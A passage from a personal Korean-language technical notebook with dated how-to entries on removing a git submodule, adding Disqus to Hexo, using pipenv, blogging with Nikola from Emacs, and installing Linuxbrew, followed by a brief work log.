    $ git rm --cached themes/next
    ```
3.  .git 디렉토리 아래 해당 모듈 삭제  
    
    ```text
    $ rm -rf .git/moudle/themes/next
    ```
4.  submodule 디렉토리 삭제  
    
    ```text
    $ rm -rf themes/next
    ```
5.  commit and push  
    
    ```text
    $ git commit -m "remove submodule"
    $ git push
    ```


#### <span class="section-num">3.337.4</span> 관련 링크 {#관련-링크}

<https://ohgyun.com/711>  
<https://git-scm.com/book/ko/v1/Git-도구-서브모듈>  
<https://kyubot.tistory.com/129>  
<https://jjeong.tistory.com/1345>  


### <span class="section-num">3.338</span> disqus  추가하기 {#disqus-추가하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-08 금 01:09&gt;</span></span>  
hexo next에 disquss 를 추가하는 방법이다.  
요약하자면  

1.  disqus 가입
2.  themes/next 디렉토리의 \_config.yml 파일 수정  
    comments: 섹션에 있다.  
    
    ```text
    # Disqus
    disqus:
      enable: true
      shortname: ybgwon
      count: true
      lazyload: false
      #post_meta_order: 0
    
    ```
3.  deploy  
    
    ```text
    $ hexo g -d
    ```


#### <span class="section-num">3.338.1</span> 관련 링크 {#관련-링크}

<https://goodgoodjm.github.io/blog/disqus-with-hexo-next/>  
<https://theme-next.org/docs/third-party-services/comments>  


### <span class="section-num">3.339</span> pipenv {#pipenv}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-12 화 18:06&gt;</span></span>  
python virtual env를 사용하려고 문서를 찾다 보니 요즘에는  
pipenv를 사용한다더라.  
\*주의\*  
다른 문서른 보면 업데이트가 안되니 사용하지 말라더라 -\_-;;  

어찌됐든 설치하고 사용하는 방법을 메모해 본다  

1.  설치  
    
    ```text
    $ sudo apt install python3-pip
    $ pip3 install --user pipenv
    ```
2.  initialize a Python 3 virtual environment  
    
    ```text
    $ pipenv --three
    ✔ Successfully created virtual environment! 
    Virtualenv location: /home/ybgwon/.virtualenvs/ybgwon-VcvD19aq
    ```
    
    현재 디렉토리를 project 디렉토리로 설정한다.
3.  project 삭제  
    
    ```text
    $ pipenv --rm
    $ rm Pipfile
    ```
4.  사용법 보기  
    
    ```text
    $ pipenv -h
    ```


### <span class="section-num">3.340</span> emacs, nikola 이용 블로깅 {#emacs-nikola-이용-블로깅}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-13 수 17:34&gt;</span></span>  
emacs 에서 nikola를 이용하여 bloging하는 법이 인터넷에 있어시도해 보았다.  


#### <span class="section-num">3.340.1</span> nikola 설치 {#nikola-설치}

python3 와 virtualenv 가 필요하다.  
virtualenv 사용법은 다른 글 참조  

```text
$ mkvirtualenv -p /usr/bin/python3 nikola
$ pip install --upgrade pip setuptools wheel
$ pip install --upgrade "Nikola[extras]"
```


#### <span class="section-num">3.340.2</span> initialize a site {#initialize-a-site}

1.  github 저장소를 clone 해 온다.  
    
    ```text
    $ git clone git@github.com:ybgwon/ybgwon.github.io.git blog
    $ cd blog
    ```
2.  nikola 에게 현재 디렉토리를 초기화하라고 지시  
    
    ```text
    $ nikola init --quiet .
    ```
3.  org plugin 설치  
    
    ```text
    $ nikola plugin -i orgmode
    ```
4.  conf.py 파일 수정대략 수정한 부분  
    
    ```text
    19,20c19,20
    < BLOG_AUTHOR = "ybgwon"  # (translatable)
    < BLOG_TITLE = "YB Gwon's ..."  # (translatable)
    ---
    > BLOG_AUTHOR = "Your Name"  # (translatable)
    > BLOG_TITLE = "Demo Site"  # (translatable)
    23c23
    < SITE_URL = "https://ybgwon.github.io/"
    ---
    > SITE_URL = "https://example.com/"
    26,28c26,28
    < # BASE_URL = "https://ybgwon.github.io/"
    < BLOG_EMAIL = "ybgwon@nospam.gmail.com"
    < BLOG_DESCRIPTION = "personal blog"  # (translatable)
    ---
    > # BASE_URL = "https://example.com/"
    > BLOG_EMAIL = "joe@demo.site"
    > BLOG_DESCRIPTION = "This is a demo site for Nikola."  # (translatable)
    94c94
    < DEFAULT_LANG = "ko"
    ---
    > DEFAULT_LANG = "en"
    142,144c142,144
    <         ("/archive.html", "저장소"),
    <         ("/categories/", "태그"),
    <         ("/rss.xml", "RSS 목록"),
    ---
    >         ("/archive.html", "Archives"),
    >         ("/categories/index.html", "Tags"),
    >         ("/rss.xml", "RSS feed"),
    224d223
    <     ("posts/*.org", "posts", "post.tmpl"),
    231d229
    <     ("pages/*.org", "pages", "page.tmpl"),
    244c242
    < TIMEZONE = "Asia/Seoul"
    ---
    > TIMEZONE = "UTC"
    311,312d308
    <     # Emacs org mode
    <     "orgmode" : ('.org',),
    983c979
    < COMMENT_SYSTEM_ID = "ybgwon"
    ---
    > COMMENT_SYSTEM_ID = "nikolademo"
    ```


#### <span class="section-num">3.340.3</span> 사이트 빌드 {#사이트-빌드}

```text
$ nikola build
```


#### <span class="section-num">3.340.4</span> 글쓰기 {#글쓰기}

orgmode 플러그인을 설치 했으므로 org 파일로 글을 작성할 수 있다.  

1.  편의를 위해 먼저 snippet 파일을 만든다.  
    
    ```text
    $ cat /home/ybgwon/Dropbox/Emacs/snippets/org-mode/+new-snippet+
    # -*- mode: snippet -*-
    # name: _post 
    # key: _post
    # expand-env: ((yas-indent-line 'fixed') (yas-wrap-around-region 'nil))
    # --
    
    #+BEGIN_COMMENT
    .. title: ${1: `(capitalize (replace-regexp-in-string "-\\|_" " " (file-name-base)))`}
    .. slug: `(file-name-base)`
    .. date: `(format-time-string "%Y-%m-%d %H:%M:%S UTC+09:00" (current-time))`
    .. tags: $2
    .. category: 
    .. link: 
    .. description: 
    .. type: text
    #+END_COMMENT
    
    *
    $0
    ```

2.  org 모드로 글작성후 빌드  
    
    ```text
    $ nikola auto --browser
    ```


#### <span class="section-num">3.340.5</span> github deploy {#github-deploy}

1.  먼저 현재 로컬 변경사항을 커밋  
    
    ```text
    $ git commit -m "add new post"
    ```
2.  아까 clone 해 온 github 페이지에 commit  
    
    ```text
    $ nikola github_deploy
    ```
    
    명령이 완료되면 src 브랜치가 생기고 src 브랜치에는 소스가  
    master 브랜치에는 서비스할 웹페이지가 외부 저장소에 커밋된다.
3.  emacs function 만들기  
    
    ```text
    (defun my-nikola-deploy ()
    (interactive)
    (shell-command "cd ~/Work/github-io/nikola/blog; nikola github_deploy"))
    ```


#### <span class="section-num">3.340.6</span> prodigy 와 연동하기 {#prodigy-와-연동하기}

use-package 사용. .emacs 파일에 아래 추가  

```text
(use-package prodigy
  :ensure t
  :config
  (prodigy-define-service
    :name "nikola"
    :command "nikola"
    :args '("auto")
    :cwd "/home/ybgwon/Work/github-io/nikola/blog"
    :tags '(blog nikola)
    :stop-signal 'sigint
    :kill-process-buffer-on-stop t))
```

key binding  

```text
M-x prodigy
$		prodigy-display-process
S		prodigy-stop
r		prodigy-restart
s		prodigy-start
o		prodigy-browse
q		quit-window
```


#### <span class="section-num">3.340.7</span> 관련 링크 {#관련-링크}

<https://cestlaz.github.io/posts/using-emacs-35-blogging/>  
<https://getnikola.com/getting-started.html>  
<http://wikemacs.org/wiki/Nikola>  


### <span class="section-num">3.341</span> homebrew 설치하기 {#homebrew-설치하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-13 수 21:18&gt;</span></span>  

1.  아래 스크립트 실행  
    
    ```text
    $ sh -c "$(curl -fsSL https://raw.githubusercontent.com/Linuxbrew/install/master/install.sh)"
    ```
2.  환경설정 추가  
    
    ```text
    echo 'eval $(/home/linuxbrew/.linuxbrew/bin/brew shellenv)' >> ~/.profile
    ```
    
    .profile에 환경설정이 추가된다. PATH 등 brew 관련 환경 변수가셋팅된다


#### <span class="section-num">3.341.1</span> 관련 링크 {#관련-링크}

<https://docs.brew.sh/Homebrew-on-Linux>  


## <span class="section-num">4</span> WorkLog {#worklog}



### <span class="section-num">4.1</span> <span class="timestamp-wrapper"><span class="timestamp">&lt;2018-02-02 금 18:48&gt;</span></span> {#}

tj uart 버그 픽스  
keypad 설정펌웨어 배포  

다음주 과제는백라이트 버그  
mfgtools sdcard 라이트  
ov5648 카메라 포팅 시도
